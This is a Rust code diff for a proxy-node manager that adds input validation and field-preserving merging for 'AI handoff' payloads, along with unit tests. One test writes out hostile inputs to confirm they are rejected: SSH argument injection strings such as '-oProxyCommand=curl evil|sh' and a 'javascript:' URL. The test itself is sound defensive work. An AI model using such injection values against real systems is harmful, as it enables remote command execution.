@@ -1,6 +1,7 @@
 use crate::models::{
     AppSettings, CarrierSample, HandoffPayload, HistoryBucket, NodeConfig, NodeSecrets,
 };
+use crate::validate;
 use chrono::Utc;
 use std::collections::{HashMap, VecDeque};
 use std::fs;
@@ -211,60 +212,92 @@ pub fn delete_secrets(node_id: &str) {
     }
 }
 
-pub fn upsert_from_handoff(payload: HandoffPayload) -> Result<NodeConfig, String> {
-    let mut nodes = load_nodes();
-    let clean_host = payload.host.trim().to_string();
-    if clean_host.is_empty() {
-        return Err("host cannot be empty".to_string());
-    }
+/// Non-empty, trimmed optional string.
+fn present(value: Option<String>) -> Option<String> {
+    value
+        .map(|s| s.trim().to_string())
+        .filter(|s| !s.is_empty())
+}
 
-    let existing_id = nodes
-        .iter()
-        .find(|n| n.host == clean_host)
-        .map(|n| n.id.clone());
-    let id = existing_id.unwrap_or_else(|| Uuid::new_v4().to_string());
+/// Validates a handoff payload and merges it over the existing node with the same host:
+/// fields omitted by the payload keep their stored value (re-running an AI handoff only
+/// rotates credentials instead of wiping quota / SSH settings), and `createdAt` is preserved.
+fn merge_handoff(payload: &HandoffPayload, existing: Option<&NodeConfig>) -> Result<NodeConfig, String> {
+    let host = validate::host(&payload.host)?;
+    let panel_url = if payload.panel_url.trim().is_empty() {
+        existing.map(|n| n.panel_url.clone()).unwrap_or_default()
+    } else {
+        validate::http_url(&payload.panel_url, "panelUrl")?
+    };
+    let pick_label = |incoming: &Option<String>, stored: Option<&String>, fallback: &str| {
+        present(incoming.clone())
+            .map(|s| validate::label(&s))
+            .filter(|s| !s.is_empty())
+            .or_else(|| stored.cloned())
+            .unwrap_or_else(|| fallback.to_string())
+    };
+    let flag = pick_label(&payload.flag, existing.map(|n| &n.flag), "🌐");
+    let city = pick_label(&payload.city, existing.map(|n| &n.city), &host);
+    let isp_tag = pick_label(&payload.isp_tag, existing.map(|n| &n.isp_tag), "Dual ISP");
+    let default_name = format!("{flag} {city} · {isp_tag}");
+    let name = pick_label(&payload.name, existing.map(|n| &n.name), &default_name);
+    let ssh_user = match present(payload.ssh_user.clone()) {
+        Some(user) => validate::ssh_user(&user)?,
+        None => existing.map_or_else(|| "root".to_string(), |n| n.ssh_user.clone()),
+    };
+    let ssh_key_path = match present(payload.ssh_key_path.clone()) {
+        Some(path) => Some(validate::file_path(&path)?),
+        None => existing.and_then(|n| n.ssh_key_path.clone()),
+    };
+    let sub_url = validate::optional_http_url(payload.sub_url.as_deref(), "subUrl")?
+        .or_else(|| existing.and_then(|n| n.sub_url.clone()));
+    let mihomo_sub_url = validate::optional_http_url(payload.mihomo_sub_url.as_deref(), "mihomoSubUrl")?
+        .or_else(|| existing.and_then(|n| n.mihomo_sub_url.clone()));
+    let monthly_total_gb = payload
+        .monthly_total_gb
+        .filter(|gb| gb.is_finite() && *gb > 0.0)
+        .or_else(|| existing.map(|n| n.monthly_total_gb))
+        .unwrap_or(1000.0);
 
-    let flag = payload
-        .flag
-        .filter(|s| !s.trim().is_empty())
-        .unwrap_or_else(|| "🌐".to_string());
-    let city = payload
-        .city
-        .filter(|s| !s.trim().is_empty())
-        .unwrap_or_else(|| clean_host.clone());
-    let isp_tag = payload
-        .isp_tag
-        .filter(|s| !s.trim().is_empty())
-        .unwrap_or_else(|| "Dual ISP".to_string());
-    let name = payload
-        .name
-        .filter(|s| !s.trim().is_empty())
-        .unwrap_or_else(|| format!("{} {} · {}", flag, city, isp_tag));
-
-    let node = NodeConfig {
-        id: id.clone(),
+    Ok(NodeConfig {
+        id: existing.map_or_else(|| Uuid::new_v4().to_string(), |n| n.id.clone()),
         name,
         flag,
         city,
         isp_tag,
-        host: clean_host,
-        vless_port: payload.vless_port.unwrap_or(443),
-        panel_url: payload.panel_url.trim().trim_end_matches('/').to_string(),
-        panel_username: payload.panel_username.filter(|s| !s.trim().is_empty()),
-        sub_url: payload.sub_url.filter(|s| !s.trim().is_empty()),
-        mihomo_sub_url: payload.mihomo_sub_url.filter(|s| !s.trim().is_empty()),
-        ssh_port: payload.ssh_port.unwrap_or(22),
-        ssh_user: payload
-            .ssh_user
-            .filter(|s| !s.trim().is_empty())
-            .unwrap_or_else(|| "root".to_string()),
-        ssh_key_path: payload.ssh_key_path.filter(|s| !s.trim().is_empty()),
-        reality_target: payload.reality_target.filter(|s| !s.trim().is_empty()),
-        monthly_total_gb: payload.monthly_total_gb.unwrap_or(1000.0),
-        reset_day: payload.reset_day.unwrap_or(1).clamp(1, 31),
-        created_at: Utc::now().to_rfc3339(),
-        source: payload.source.unwrap_or_else(|| "ai-handoff".to_string()),
-    };
+        host,
+        vless_port: payload.vless_port.or(existing.map(|n| n.vless_port)).unwrap_or(443),
+        panel_url,
+        panel_username: present(payload.panel_username.clone())
+            .map(|u| validate::label(&u))
+            .or_else(|| existing.and_then(|n| n.panel_username.clone())),
+        sub_url,
+        mihomo_sub_url,
+        ssh_port: payload.ssh_port.or(existing.map(|n| n.ssh_port)).unwrap_or(22),
+        ssh_user,
+        ssh_key_path,
+        reality_target: present(payload.reality_target.clone())
+            .map(|t| validate::label(&t))
+            .or_else(|| existing.and_then(|n| n.reality_target.clone())),
+        monthly_total_gb,
+        reset_day: payload
+            .reset_day
+            .or(existing.map(|n| n.reset_day))
+            .unwrap_or(1)
+            .clamp(1, 31),
+        created_at: existing.map_or_else(|| Utc::now().to_rfc3339(), |n| n.created_at.clone()),
+        source: present(payload.source.clone())
+            .map(|s| validate::label(&s))
+            .unwrap_or_else(|| "ai-handoff".to_string()),
+    })
+}
+
+pub fn upsert_from_handoff(payload: HandoffPayload) -> Result<NodeConfig, String> {
+    let mut nodes = load_nodes();
+    let host = validate::host(&payload.host)?;
+    let existing = nodes.iter().find(|n| n.host == host);
+    let node = merge_handoff(&payload, existing)?;
+    let id = node.id.clone();
 
     let mut secrets = load_secrets(&id);
     if payload.api_token.as_ref().is_some_and(|s| !s.trim().is_empty()) {
@@ -294,4 +327,81 @@ pub fn remove_node(node_id: &str) -> Result<Vec<NodeConfig>, String> {
     save_nodes(&nodes)?;
     delete_secrets(node_id);
     Ok(nodes)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn payload(host: &str) -> HandoffPayload {
+        HandoffPayload {
+            name: None,
+            flag: None,
+            city: None,
+            isp_tag: None,
+            host: host.into(),
+            vless_port: None,
+            panel_url: "http://1.2.3.4:2053/base/".into(),
+            panel_username: None,
+            panel_password: None,
+            api_token: None,
+            sub_url: None,
+            mihomo_sub_url: None,
+            ssh_port: None,
+            ssh_user: None,
+            ssh_key_path: None,
+            reality_target: None,
+            monthly_total_gb: None,
+            reset_day: None,
+            source: None,
+        }
+    }
+
+    #[test]
+    fn merge_keeps_stored_fields_omitted_by_a_repeat_handoff() {
+        let first = merge_handoff(
+            &HandoffPayload {
+                city: Some("Los Angeles".into()),
+                monthly_total_gb: Some(2000.0),
+                reset_day: Some(25),
+                ssh_port: Some(2222),
+                ssh_key_path: Some("~/.ssh/id_ed25519_native_isp".into()),
+                ..payload("1.2.3.4")
+            },
+            None,
+        )
+        .unwrap();
+        assert_eq!(first.panel_url, "http://1.2.3.4:2053/base");
+        assert_eq!(first.name, "🌐 Los Angeles · Dual ISP");
+
+        let second = merge_handoff(&payload("1.2.3.4"), Some(&first)).unwrap();
+        assert_eq!(second.id, first.id);
+        assert_eq!(second.created_at, first.created_at);
+        assert_eq!(second.monthly_total_gb, 2000.0);
+        assert_eq!(second.reset_day, 25);
+        assert_eq!(second.ssh_port, 2222);
+        assert_eq!(second.ssh_key_path, first.ssh_key_path);
+        assert_eq!(second.city, "Los Angeles");
+    }
+
+    #[test]
+    fn merge_rejects_injection_and_non_web_urls() {
+        assert!(merge_handoff(&payload("-oProxyCommand=id"), None).is_err());
+        assert!(merge_handoff(
+            &HandoffPayload {
+                ssh_user: Some("-oProxyCommand=curl evil|sh".into()),
+                ..payload("1.2.3.4")
+            },
+            None
+        )
+        .is_err());
+        assert!(merge_handoff(
+            &HandoffPayload {
+                sub_url: Some("javascript:alert(1)".into()),
+                ..payload("1.2.3.4")
+            },
+            None
+        )
+        .is_err());
+    }
 }
